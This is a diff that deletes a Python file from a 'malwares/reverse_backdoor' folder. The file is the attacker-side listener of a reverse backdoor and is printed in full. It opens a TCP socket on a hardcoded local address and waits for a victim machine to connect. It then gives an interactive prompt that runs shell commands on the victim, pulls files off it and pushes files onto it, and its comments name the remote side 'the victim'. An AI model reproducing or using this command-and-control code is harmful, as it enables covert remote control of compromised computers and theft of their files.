--- malwares/reverse_backdoor/listener.py
@@ -1,163 +1,0 @@
-#!usr/bin/env python3
-import base64
-import socket
-import sys
-import json
-
-class Listener:
-    
-    def __init__(self, ip:str, port:int) -> None:   
-        '''
-        description: Creates a Listener which opens a port on the attackers machine through TCP socket.
-        params: ip(str), port(int)
-        returns: None
-        ''' 
-        self.ip = ip 
-        self.port = port
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server.bind((self.ip,self.port))
-        self.server.listen(0)
-        print('[*] Server started and waiting for incoming connections.')
-
-        self.connection, self.conn_addr = self.server.accept()
-
-        print(f'[*] Incoming connection from {self.conn_addr}')
-
-
-    def serial_send(self, data:str or list) :
-        '''
-        description: serialize data and send over TCP socket.
-        params: data(str or list)
-        returns: None
-        '''
-        if type(data) == bytes:
-            data = str(data, encoding='utf-8')
-
-        json_data = json.dumps(data)
-        bytes_json_data = bytes(json_data, encoding='utf-8')
-        # print('Listener sent: ',bytes_json_data)
-        self.connection.send(bytes_json_data)
-
-
-    def serial_receive(self) -> str :
-        '''
-        description: receive serialized data over TCP socket and retrieve original data.
-        params: None
-        returns: str
-        '''
-        bytes_json_data = b''
-        while True:
-            try:
-                bytes_json_data += self.connection.recv(1024)
-                data = json.loads(bytes_json_data)
-                # print('Listener Rec: ',data)
-                return data
-            except json.JSONDecodeError:
-                continue
-
-
-    def execute_remotely(self, command)->str:
-        '''
-        description: execute command on the remote machine.
-        params: command
-        returns: command output (str)
-        '''
-        self.serial_send(command)
-        return self.serial_receive()
-
-
-    def write_file(self, path, content):
-        '''
-        description: write downloaded contents from the victim to the specified path file.
-        params: path, content
-        returns: str or None
-        '''
-        with open(path, 'wb') as file:
-            bytes_content = base64.b64decode(content)
-            file.write(bytes_content)
-            return (f'[*] File {path} Downloaded successfully.')
-
-
-    def read_file(self, path):
-        '''
-		description: upload file contents to the victim's machine.
-        params: path
-        returns: bytes
-		'''
-        with open(path, 'rb') as file:
-            file_content = file.read()
-            base64_file_content = base64.b64encode(file_content)
-            return base64_file_content
-
-
-    def download_dir_files(self, files_count):
-        pass
-
-
-    def run(self):
-        '''
-        description: start listener.
-        params: None
-        returns: None
-        '''
-        connected_ip = self.conn_addr[0]
-        while True:
-            try:
-                command = input(f'{connected_ip} >> ')
-
-                # create list and get commands with args
-                command_lst = command.split(' ')
-                command_list_len = len(command_lst)>=2
-                cmd = command_lst[0]
-                if command_list_len:
-                    path = command_lst[1]
-                
-                if cmd == 'exit':
-                    self.execute_remotely('exit')
-                    self.connection.close()
-                    sys.exit()
-
-                elif cmd == 'download' and command_list_len:
-                    contents = self.execute_remotely(command)
-                    if 'Exception' in contents:
-                        print(contents)
-                    else: 
-                        execution_result = self.write_file(path, contents)
-
-                elif cmd == 'upload' and command_list_len:
-                    print('[*] Listener : Uploading file to the victim machine.')
-                    str_file_contents = str(self.read_file(path), encoding='utf-8')
-                    command +=  ' ' + str_file_contents
-                    # self.serial_send(command)
-                    execution_result = self.execute_remotely(command)
-
-                elif cmd == 'download_dir_files' and command_list_len:
-                    print(f'[*] Downloading dir {path} files.')
-                    files_count = self.execute_remotely(cmd)
-                    for _ in range(int(files_count)):
-                        # file_contents = self.serial_receive()
-                        pass
-                else :
-                    # print('[-] Listener else')
-                    execution_result = self.execute_remotely(command)
-                
-                print(execution_result)
-
-            except KeyboardInterrupt:
-                print('[!] ctrl+c detected.')
-
-            except IndexError:
-                print('[!] Cannot Accept empty command.')
-
-            # except Exception as e:
-            #     print('[-] Listener Exception : ', e)
-
-
-if __name__ == '__main__':
-    try:
-        listener = Listener('192.168.0.199',8082)
-        listener.run()
-    except Exception as e:
-        print('[-] Exception : ',e)
